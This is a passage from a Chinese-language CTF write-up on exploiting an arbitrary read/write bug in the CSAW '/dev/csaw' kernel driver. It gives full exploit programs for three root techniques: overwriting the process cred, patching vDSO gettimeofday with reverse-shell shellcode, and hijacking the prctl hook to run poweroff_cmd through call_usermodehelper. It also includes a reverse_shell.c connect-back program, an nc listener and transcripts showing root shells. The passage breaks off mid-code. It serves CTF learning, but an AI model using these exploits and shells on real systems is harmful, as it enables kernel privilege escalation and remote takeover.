alloc_args.id; shrink_args.size = 0x100+1; ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_args); puts("[+] we can read and write any momery"); for(;addr&lt;0xffffc80000000000;addr+=0x1000)&#123; seek_args.id = alloc_args.id; seek_args.index = addr-0x10 ; seek_args.whence= SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args); read_args.id = alloc_args.id; read_args.buf = buf; read_args.count = 0x1000; ioctl(fd,CSAW_READ_CHANNEL,&amp;read_args); result = memmem(buf,0x1000,target,16); //printf("0x%lx",addr); if (result) &#123; cred = *(size_t *)(result - 0x8); real_cred = *(size_t *)(result - 0x10); if( (cred||0xff00000000000000) &amp;&amp; (real_cred == cred))&#123; //printf("[]%lx[]",result-(int)(buf)); target_addr = addr + result-(int)(buf); printf("[+]found task_struct 0x%lx\n",target_addr); printf("[+]found cred 0x%lx\n",real_cred); break; &#125; &#125; &#125; if(result == 0)&#123; puts("not found , try again "); exit(-1); &#125; for (int i = 0; i&lt;44;i++)&#123; seek_args.id = alloc_args.id; seek_args.index = cred-0x10 +4 + i ; seek_args.whence= SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args); root_cred[0] = 0; write_args.id = alloc_args.id; write_args.buf = (char *)root_cred; write_args.count = 1; ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args); &#125; if (getuid() == 0)&#123; printf("[+]now you are r00t,enjoy ur shell\n"); system("/bin/sh"); &#125; else&#123; puts("[-] there must be something error ... "); exit(-1); &#125; return 0;&#125; 1234567891011/ $ iduid=1000(chal) gid=1000(chal) groups=1000(chal)/ $ ./pwn_task_struct[+] now we get a channel 1[+] we can read and write any momery[+]found task_struct 0xffff880007f8c800[+]found cred 0xffff88000f946180[+]now you are r00t,enjoy ur shell/ # iduid=0(root) gid=0(root) groups=1000(chal)/ # 2 劫持VDSO这种方法是内核态通过映射的方法与用户态共享一块物理内存，从而达到加快执行效率的目的，也是影子内存。当在内核态修改内存时，用户态所访问到的数据同样会改变，这样的数据区在用户态有两块，vdso和vsyscall。 123456789101112131415161718LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x400000 0x401000 r-xp 1000 0 /home/p4nda/Desktop/pwn/test/getauxval/su_me 0x600000 0x601000 r--p 1000 0 /home/p4nda/Desktop/pwn/test/getauxval/su_me 0x601000 0x602000 rw-p 1000 1000 /home/p4nda/Desktop/pwn/test/getauxval/su_me 0x7ffff7a0d000 0x7ffff7bcd000 r-xp 1c0000 0 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7bcd000 0x7ffff7dcd000 ---p 200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7dcd000 0x7ffff7dd1000 r--p 4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7dd1000 0x7ffff7dd3000 rw-p 2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7ffff7dd3000 0x7ffff7dd7000 rw-p 4000 0 0x7ffff7dd7000 0x7ffff7dfd000 r-xp 26000 0 /lib/x86_64-linux-gnu/ld-2.23.so 0x7ffff7fdd000 0x7ffff7fe0000 rw-p 3000 0 0x7ffff7ff8000 0x7ffff7ffa000 r--p 2000 0 [vvar] 0x7ffff7ffa000 0x7ffff7ffc000 r-xp 2000 0 [vdso] 0x7ffff7ffc000 0x7ffff7ffd000 r--p 1000 25000 /lib/x86_64-linux-gnu/ld-2.23.so 0x7ffff7ffd000 0x7ffff7ffe000 rw-p 1000 26000 /lib/x86_64-linux-gnu/ld-2.23.so 0x7ffff7ffe000 0x7ffff7fff000 rw-p 1000 0 0x7ffffffdd000 0x7ffffffff000 rw-p 22000 0 [stack]0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall] 关于VDSOVDSO就是Virtual Dynamic Shared Object。这个.so文件不在磁盘上，而是在内核里头。内核把包含某.so的内存页在程序启动的时候映射入其内存空间，对应的程序就可以当普通的.so来使用里头的函数。而vdso里的函数主要有五个,都是对时间要求比较高的。 12345clock_gettime 0000000000000A10 gettimeofday 0000000000000C80 time 0000000000000DE0 getcpu 0000000000000E00 start 0000000000000940 [main entry] 而VDSO所在的页，在内核态是可读、可写的，在用户态是可读、可执行的。其在每个程序启动的加载过程如下： 12345#0 remap_pfn_range (vma=0xffff880000bba780, addr=140731259371520, pfn=8054, size=4096, prot=...) at mm/memory.c:1737#1 0xffffffff810041ce in map_vdso (image=0xffffffff81a012c0 &lt;vdso_image_64&gt;, calculate_addr=&lt;optimized out&gt;) at arch/x86/entry/vdso/vma.c:151#2 0xffffffff81004267 in arch_setup_additional_pages (bprm=&lt;optimized out&gt;, uses_interp=&lt;optimized out&gt;) at arch/x86/entry/vdso/vma.c:209#3 0xffffffff81268b74 in load_elf_binary (bprm=0xffff88000f86cf00) at fs/binfmt_elf.c:1080#4 0xffffffff812136de in search_binary_handler (bprm=0xffff88000f86cf00) at fs/exec.c:1469 在map_vdso中首先查找到一块用户态地址，将该块地址设置为VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC，利用remap_pfn_range将内核页映射过去。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100static int map_vdso(const struct vdso_image *image, bool calculate_addr)&#123; struct mm_struct *mm = current-&gt;mm; struct vm_area_struct *vma; unsigned long addr, text_start; int ret = 0; static struct page *no_pages[] = &#123;NULL&#125;; static struct vm_special_mapping vvar_mapping = &#123; .name = "[vvar]", .pages = no_pages, &#125;; struct pvclock_vsyscall_time_info *pvti; if (calculate_addr) &#123; addr = vdso_addr(current-&gt;mm-&gt;start_stack, image-&gt;size - image-&gt;sym_vvar_start); &#125; else &#123; addr = 0; &#125; down_write(&amp;mm-&gt;mmap_sem); addr = get_unmapped_area(NULL, addr, image-&gt;size - image-&gt;sym_vvar_start, 0, 0); if (IS_ERR_VALUE(addr)) &#123; ret = addr; goto up_fail; &#125; text_start = addr - image-&gt;sym_vvar_start; current-&gt;mm-&gt;context.vdso = (void __user *)text_start; /* * MAYWRITE to allow gdb to COW and set breakpoints */ vma = _install_special_mapping(mm, text_start, image-&gt;size, VM_READ|VM_EXEC| VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC, &amp;image-&gt;text_mapping); if (IS_ERR(vma)) &#123; ret = PTR_ERR(vma); goto up_fail; &#125; vma = _install_special_mapping(mm, addr, -image-&gt;sym_vvar_start, VM_READ|VM_MAYREAD, &amp;vvar_mapping); if (IS_ERR(vma)) &#123; ret = PTR_ERR(vma); goto up_fail; &#125; if (image-&gt;sym_vvar_page) ret = remap_pfn_range(vma, text_start + image-&gt;sym_vvar_page, __pa_symbol(&amp;__vvar_page) &gt;&gt; PAGE_SHIFT, PAGE_SIZE, PAGE_READONLY); if (ret) goto up_fail;#ifdef CONFIG_HPET_TIMER if (hpet_address &amp;&amp; image-&gt;sym_hpet_page) &#123; ret = io_remap_pfn_range(vma, text_start + image-&gt;sym_hpet_page, hpet_address &gt;&gt; PAGE_SHIFT, PAGE_SIZE, pgprot_noncached(PAGE_READONLY)); if (ret) goto up_fail; &#125;#endif pvti = pvclock_pvti_cpu0_va(); if (pvti &amp;&amp; image-&gt;sym_pvclock_page) &#123; ret = remap_pfn_range(vma, text_start + image-&gt;sym_pvclock_page, __pa(pvti) &gt;&gt; PAGE_SHIFT, PAGE_SIZE, PAGE_READONLY); if (ret) goto up_fail; &#125;up_fail: if (ret) current-&gt;mm-&gt;context.vdso = NULL; up_write(&amp;mm-&gt;mmap_sem); return ret;&#125; 当时，在看这里时想到一个问题，既然vdso可以在用户态采用mprotect的方法改为rwx，而且所有用户态用的是一块物理页，为什么在用户态修改vdso不会影响到其他程序呢？最终在如下链接中找到答案。 漏洞利用当了解了上述知识，这种劫持方法就很容易理解了。 首先，利用内存读找到内存中vdso的逻辑页，由于内核态有写入的权限，因此利用任意写写入shellcode覆盖其中某些函数。 其次，等待某root进程或者有s权限的进程调用这个函数就可以利用反弹shell完成提权。与上一中方法不同的是，这种方法并不直接提权，而是采用守株待兔的方法，等待其他高权限进程触发，而返回shell。 如何爆破找到vdso呢？首先根据上文的内核内存图可以确定vdso的范围在0xffffffff80000000~0xffffffffffffefff，而且该映射满足页对齐，并且存在ELF文件结构，且所有内存值都可以知道，如用如下脚本可以dump出vdso，比较坑的是每个版本的vdso函数偏移都不一样： dump_vdos.c 1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/auxv.h&gt; #include &lt;sys/mman.h&gt;int main()&#123; unsigned long sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR); if (sysinfo_ehdr!=0)&#123; for (int i=0;i&lt;0x2000;i+=1)&#123; printf("%02x ",*(unsigned char *)(sysinfo_ehdr+i)); &#125; &#125;&#125; 经过上述步骤之后，仅需将vdso中gettimeofday函数覆写成仅有root进程提权即可，使用如下shellcode。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980https://gist.github.com/itsZN/1ab36391d1849f15b785&quot;\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb\x48\x39\xc3\x75\x0f\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x09\x5b\x48\x31\xc0\xb0\x60\x0f\x05\xc3\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x97\x50\x48\xb9\xfd\xff\xf2\xfa\x80\xff\xff\xfe\x48\xf7\xd1\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x07\x48\x31\xc0\xb0\xe7\x0f\x05\x90\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x0f\x05&quot;;noppush rbxxor rax,raxmov al, 0x66syscall #check uidxor rbx,rbxcmp rbx,raxjne emulatexor rax,raxmov al,0x39syscall #forkxor rbx,rbxcmp rax,rbxje connectbackemulate:pop rbxxor rax,raxmov al,0x60syscallretqconnectback:xor rdx,rdxpushq 0x1pop rsipushq 0x2pop rdipushq 0x29pop rax syscall #socketxchg rdi,raxpush raxmov rcx, 0xfeffff80faf2fffdnot rcxpush rcxmov rsi,rsppushq 0x10pop rdxpushq 0x2apop raxsyscall #connectxor rbx,rbxcmp rax,rbxje shxor rax,raxmov al,0xe7syscall #exitsh:noppushq 0x3pop rsiduploop:pushq 0x21pop raxdec rsisyscall #dupjne duploopmov rbx,0xff978cd091969dd0not rbxpush rbxmov rdi,rsppush raxpush rdimov rsi,rspxor rdx,rdxmov al,0x3bsyscall #execvexor rax,raxmov al,0xe7syscall EXP根据《Bypassing SMEP Using vDSO Overwrites》一文中提到的利用crontab进程会执行gettimeofday，最终提权的方法，我在QEMU未实现，由于busybox的crontab仅允许root用户设置，并且设置了之后也没有执行(????)，找到了当时比赛部署的方法是用了digitalocean-api而不是QEMU。 我用一种验证性的方法来测试可行性。以init文件中运行一个循环执行gettimeofday的脚本，来模拟crontab sudo_me.c 123456789#include &lt;stdio.h&gt;int main()&#123; while(1)&#123; puts("111"); sleep(1); gettimeofday(); &#125;&#125; pwn_vdso.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt; #include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/auxv.h&gt; #define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE+1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE+2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE+3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE+5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE+6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE+7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE+8struct alloc_channel_args &#123; size_t buf_size; int id;&#125;;struct open_channel_args &#123; int id;&#125;;struct shrink_channel_args &#123; int id; size_t size;&#125;;struct read_channel_args &#123; int id; char *buf; size_t count;&#125;;struct write_channel_args &#123; int id; char *buf; size_t count;&#125;;struct seek_channel_args &#123; int id; loff_t index; int whence;&#125;;struct close_channel_args &#123; int id;&#125;;void print_hex(char *buf,size_t len)&#123; int i ; for(i = 0;i&lt;((len/8)*8);i+=8)&#123; printf("0x%lx",*(size_t *)(buf+i) ); if (i%16) printf(" "); else printf("\n"); &#125;&#125;void show_vdso_userspace(int len)&#123; size_t addr=0; addr = getauxval(AT_SYSINFO_EHDR); if(addr&lt;0)&#123; puts("[-]cannot get vdso addr"); return ; &#125; for(int i = len;i&lt;0x1000;i++)&#123; printf("%x ",*(char *)(addr+i)); &#125;&#125;int check_vsdo_shellcode(char *shellcode)&#123; size_t addr=0; addr = getauxval(AT_SYSINFO_EHDR); printf("vdso:%lx\n", addr); if(addr&lt;0)&#123; puts("[-]cannot get vdso addr"); return 0; &#125; if (memmem((char *)addr,0x1000,shellcode,strlen(shellcode) ))&#123; return 1; &#125; return 0;&#125;int main()&#123; int fd = -1; size_t result = 0; struct alloc_channel_args alloc_args; struct shrink_channel_args shrink_args; struct seek_channel_args seek_args; struct read_channel_args read_args; struct close_channel_args close_args; struct write_channel_args write_args; size_t addr = 0xffffffff80000000; size_t real_cred = 0; size_t cred = 0; size_t target_addr ; int root_cred[12]; char shellcode[] = "\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05"; //"\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb\x48\x39\xc3\x75\x0f\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x09\x5b\x48\x31\xc0\xb0\x60\x0f\x05\xc3\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x97\x50\x48\xb9\xfd\xff\xf2\xfa\x80\xff\xff\xfe\x48\xf7\xd1\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x07\x48\x31\xc0\xb0\xe7\x0f\x05\x90\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x0f\x05"; //set target in task_struct setvbuf(stdout, 0LL, 2, 0LL); char *buf = malloc(0x1000); char target[16]; strcpy(target,"try2findmep4nda"); prctl(PR_SET_NAME , target); fd = open("/dev/csaw",O_RDWR); if(fd &lt; 0)&#123; puts("[-] open error"); exit(-1); &#125; alloc_args.buf_size = 0x100; alloc_args.id = -1; ioctl(fd,CSAW_ALLOC_CHANNEL,&amp;alloc_args); if (alloc_args.id == -1)&#123; puts("[-] alloc_channel error"); exit(-1); &#125; printf("[+] now we get a channel %d\n",alloc_args.id); shrink_args.id = alloc_args.id; shrink_args.size = 0x100+1; ioctl(fd,CSAW_SHRINK_CHANNEL,&amp;shrink_args); puts("[+] we can read and write any momery"); for(;addr&lt;0xffffffffffffefff;addr+=0x1000)&#123; seek_args.id = alloc_args.id; seek_args.index = addr-0x10 ; seek_args.whence= SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args); read_args.id = alloc_args.id; read_args.buf = buf; read_args.count = 0x1000; ioctl(fd,CSAW_READ_CHANNEL,&amp;read_args); if(( !strcmp("gettimeofday",buf+0x2cd)) )&#123; // ((*(size_t *)(buf) == 0x00010102464c457f)) &amp;&amp; result = addr; printf("[+] found vdso %lx\n",result); break; &#125; &#125; if(result == 0)&#123; puts("not found , try again "); exit(-1); &#125; ioctl(fd,CSAW_CLOSE_CHANNEL,&amp;close_args); seek_args.id = alloc_args.id; seek_args.index = result-0x10+0xc80 ; seek_args.whence= SEEK_SET; ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_args); write_args.id = alloc_args.id; write_args.buf = shellcode; write_args.count = strlen(shellcode); ioctl(fd,CSAW_WRITE_CHANNEL,&amp;write_args); if(check_vsdo_shellcode(shellcode)!=0)&#123; puts("[+] shellcode is written into vdso, waiting for a reverse shell :"); system("nc -lp 3333"); &#125; else&#123; puts("[-] someting wrong ... "); exit(-1); &#125; //show_vdso_userspace(0xc30); ioctl(fd,CSAW_CLOSE_CHANNEL,&amp;close_args); return 0;&#125; 最终可以验证反弹shell提权成功。 12345678910/ $ iduid=1000(chal) gid=1000(chal) groups=1000(chal)/ $ ./pwn[+] now we get a channel 1[+] we can read and write any momery[+] found vdso ffffffff83c04000vdso:7ffd53da9000[+] shellcode is written into vdso, waiting for a reverse shell :iduid=0(root) gid=0(root) 3 HijackPrctl强网杯中，simp1e师傅出了一道solid_core题目，用的正是此题的加强版，主要限制了内存写的范围必须大于0xffffffff80000000，并且限制了vdso的写入，预期解是这种HijackPrctl方法。 原理分析这种漏洞利用的原理在dong-hoon you(x86)分享的《New Reliable Android Kernel Root Exploitation Techniques》中提到，这种技术被用于安卓root，可以绕过PXN防御。 首先在用户执行prctl函数时，实际上是将全部参数传递给security_task_prctl函数（\kernel\sys.c 2075） 1234567891011SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3, unsigned long, arg4, unsigned long, arg5)&#123; struct task_struct *me = current; unsigned char comm[sizeof(me-&gt;comm)]; long error; error = security_task_prctl(option, arg2, arg3, arg4, arg5); if (error != -ENOSYS) return error;... 而security_task_prctl（\security\security.c）中通过hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);将参数原封不动的传入hook进行处理，而这个hook位于内核的data段上，内核态有读写权限，因此可以通过修改这个位置劫持ptctl函数的执行流程： 1234567891011121314151617int security_task_prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)&#123; int thisrc; int rc = -ENOSYS; struct security_hook_list *hp; list_for_each_entry(hp, &amp;security_hook_heads.task_prctl, list) &#123; thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5); if (thisrc != -ENOSYS) &#123; rc = thisrc; if (thisrc != 0) break; &#125; &#125; return rc;&#125; 而在《New Reliable Android Kernel Root Exploitation Techniques》提到了一个函数call_usermodehelper（\kernel\kmod.c 603），这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令。但其中提到在安卓利用时需要关闭SEAndroid。另外，这个函数与execve函数参数相似，注意的是命令第一个参数必须是程序的全路径，而不能是相对路径，如”ls”必须写成”/bin/ls”，坑了好久… 起初的利用思路是劫持prctl的hook到这个函数，但存在一个问题，hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);这里的option是int类型的，会存在一个截断，而四字节的地址一般是用户态地址，由于题目有smap显然是不行的。 12345678910111213141516171819202122232425/** * call_usermodehelper() - prepare and start a usermode application * @path: path to usermode executable * @argv: arg vector for process * @envp: environment for process * @wait: wait for the application to finish and return status. * when UMH_NO_WAIT don't wait at all, but you get no useful error back * when the program couldn't be exec'ed. This makes it safe to call * from interrupt context. * * This function is the equivalent to use call_usermodehelper_setup() and * call_usermodehelper_exec(). */int call_usermodehelper(char *path, char **argv, char **envp, int wait)&#123; struct subprocess_info *info; gfp_t gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL; info = call_usermodehelper_setup(path, argv, envp, gfp_mask, NULL, NULL, NULL); if (info == NULL) return -ENOMEM; return call_usermodehelper_exec(info, wait);&#125; 接下来就把视野转向这个函数还在哪里被调用，通过ida 的x命令可以找到一共被调用了四次。 1234Down p tomoyo_load_policy+DD call near ptr call_usermodehelper-2E1792hDown p cgroup_release_agent+CC call near ptr call_usermodehelper-7C191hDown p run_cmd+35 call near ptr call_usermodehelper-0BF9AhUp p mce_do_trigger+1B call call_usermodehelper+552B0h tomoyo_load_policy（security\tomoyo\load_policy.c, line 84）和cgroup_release_agent（file kernel/cgroup.c, line 5753.）限制的比较死，就不赘述了。 mce_do_trigger（arch/x86/kernel/cpu/mcheck/mce.c, line 1323）的rdi、rsi两个参数也都是data段上的地址，可以通过任意写预先将要执行的命令布置在这个地址上，从而利用call_usermodehelper执行。但是要改的东西稍微多一点。 12345678910111213141516171819202122232425262728293031static void mce_do_trigger(struct work_struct *work)&#123; call_usermodehelper(mce_helper, mce_helper_argv, NULL, UMH_NO_WAIT);&#125;pwndbg&gt; x /10i mce_do_trigger 0xffffffff810422b0 &lt;mce_do_trigger&gt;: data16 data16 data16 xchg ax,ax 0xffffffff810422b5 &lt;mce_do_trigger+5&gt;: push rbp 0xffffffff810422b6 &lt;mce_do_trigger+6&gt;: xor ecx,ecx 0xffffffff810422b8 &lt;mce_do_trigger+8&gt;: xor edx,edx 0xffffffff810422ba &lt;mce_do_trigger+10&gt;: mov rsi, 0xffffffff810422c1 &lt;mce_do_trigger+17&gt;: mov rdi,0xffffffff8217ed20 0xffffffff810422c8 &lt;mce_do_trigger+24&gt;: mov rbp,rsp 0xffffffff810422cb &lt;mce_do_trigger+27&gt;: call 0xffffffff81097580 &lt;call_usermodehelper&gt; 0xffffffff810422d0 &lt;mce_do_trigger+32&gt;: pop rbp 0xffffffff810422d1 &lt;mce_do_trigger+33&gt;: ret pwndbg&gt; x /10s 0xffffffff8217ed200xffffffff8217ed20 &lt;mce_helper&gt;: &quot;&quot;0xffffffff8217ed21 &lt;mce_helper+1&gt;: &quot;&quot;0xffffffff8217ed22 &lt;mce_helper+2&gt;: &quot;&quot;0xffffffff8217ed23 &lt;mce_helper+3&gt;: &quot;&quot;0xffffffff8217ed24 &lt;mce_helper+4&gt;: &quot;&quot;0xffffffff8217ed25 &lt;mce_helper+5&gt;: &quot;&quot;0xffffffff8217ed26 &lt;mce_helper+6&gt;: &quot;&quot;0xffffffff8217ed27 &lt;mce_helper+7&gt;: &quot;&quot;0xffffffff8217ed28 &lt;mce_helper+8&gt;: &quot;&quot;0xffffffff8217ed29 &lt;mce_helper+9&gt;: &quot;&quot;pwndbg&gt; x /10gx 0xffffffff8217ed200xffffffff8217ed20 &lt;mce_helper&gt;: 0x0000000000000000 0x00000000000000000xffffffff8217ed30 &lt;mce_helper+16&gt;: 0x0000000000000000 0x00000000000000000xffffffff8217ed40 &lt;mce_helper+32&gt;: 0x0000000000000000 0x00000000000000000xffffffff8217ed50 &lt;mce_helper+48&gt;: 0x0000000000000000 0x0000000000000000 最后是run_cmd（kernel/reboot.c, line 393）这个函数就比较无脑了，里面会利用argv_split自动切割参数，但cmd还是存在参数截断的问题，继续查看调用可以发现reboot_work_func和poweroff_work_func两个函数都调用了run_cmd函数，并且内置的命令都是在内核里。 123456789101112131415161718192021static int run_cmd(const char *cmd)&#123; char **argv; static char *envp[] = &#123; "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL &#125;; int ret; argv = argv_split(GFP_KERNEL, cmd, NULL); if (argv) &#123; ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); argv_free(argv); &#125; else &#123; ret = -ENOMEM; &#125; return ret;&#125;Down p reboot_work_func+10 call run_cmdDown p poweroff_work_func+18 call run_cmd 这里又是一个坑，我起初用的reboot_work_func函数，但这个函数所用的reboot_cmd参数在.rodata段上，不具有写权限… 而poweroff_work_func函数的poweroff_cmd参数在.data段上可读可写（为啥要差别对待？？）。 12345678pwndbg&gt; x /5i reboot_work_func 0xffffffff810a3690 &lt;reboot_work_func&gt;: data16 data16 data16 xchg ax,ax 0xffffffff810a3695 &lt;reboot_work_func+5&gt;: push rbp 0xffffffff810a3696 &lt;reboot_work_func+6&gt;: mov rdi,0xffffffff81a26f80 0xffffffff810a369d &lt;reboot_work_func+13&gt;: mov rbp,rsp 0xffffffff810a36a0 &lt;reboot_work_func+16&gt;: call 0xffffffff810a34e0 &lt;run_cmd&gt;pwndbg&gt; x /s 0xffffffff81a26f800xffffffff81a26f80 &lt;reboot_cmd&gt;: &quot;/sbin/reboot&quot; 12345678910pwndbg&gt; x /7i poweroff_work_func 0xffffffff810a39c0 &lt;poweroff_work_func&gt;: data16 data16 data16 xchg ax,ax 0xffffffff810a39c5 &lt;poweroff_work_func+5&gt;: push rbp 0xffffffff810a39c6 &lt;poweroff_work_func+6&gt;: mov rdi,0xffffffff81e4dfa0 0xffffffff810a39cd &lt;poweroff_work_func+13&gt;: mov rbp,rsp 0xffffffff810a39d0 &lt;poweroff_work_func+16&gt;: push rbx 0xffffffff810a39d1 &lt;poweroff_work_func+17&gt;: movzx ebx,BYTE PTR [rip+0x1157ad8] # 0xffffffff821fb4b0 &lt;poweroff_force&gt; 0xffffffff810a39d8 &lt;poweroff_work_func+24&gt;: call 0xffffffff810a34e0 &lt;run_cmd&gt;pwndbg&gt; x /s 0xffffffff81e4dfa00xffffffff81e4dfa0 &lt;poweroff_cmd&gt;: &quot;/sbin/poweroff&quot; 漏洞利用首先可以利用VDSO的爆破得到VDSO的地址，而不难发现VDSO在vmlinux代码中，可以通过ida的可见字符串的__vdso_gettimeofday很容找到其偏移，从而得到kernel base。 而得到kernel base之后，就可以找到需要覆写的hook位置和字符串地址了。 通过将prctl_hook覆写为poweroff_work_func地址，并将poweroff_cmd处改为一个反弹shell的binary命令，监听端口就可以拿到shell。 在此处我没有调用selinux_disable就执行了call_usermodehelper，在我搭建的环境和强网杯solid_core给出的离线环境中都没有被selinux阻止。 EXPreverse_shell.c 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;#include &lt;netdb.h&gt;#include &lt;sys/types.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc,char *argv[])&#123; int sockfd,numbytes; char buf[BUFSIZ]; struct sockaddr_in their_addr; while((sockfd = socket(AF_INET,SOCK_STREAM,0)) == -1); their_addr.sin_family = AF_INET; their_addr.sin_port = htons(2333); their_addr.sin_addr.s_addr=inet_addr("127.0.0.1"); bzero(&amp;(their_addr.sin_zero), 8); while(connect(sockfd,(struct sockaddr*)&amp;their_addr,sizeof(struct sockaddr)) == -1); dup2(sockfd,0); dup2(sockfd,1); dup2(sockfd,2); system("/bin/sh"); return 0;&#125; pwn_hijackprctl.c 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt; #include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/auxv.h&gt; #define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE+1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE+2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE+3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE+5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE+6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE+7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE+8struct alloc_channel_args &#123; size_t buf_size; int id;&#125;;struct open_channel_args &#123; int id;&#125;;struct shrink_channel_args &#123; int id; size_t size;&#125;;struct read_channel_args &#123; int id; char *buf; size_t count;&#125;;struct write_channel_args &#123; int id; char *buf; size_t count;&#125;;struct seek_channel_args &#123; int id; loff_t index; int whence;&#125;;struct close_channel_args &#123; int id;&#125;;void print_hex(char *buf,size_t len)&#123; int i ; for(i = 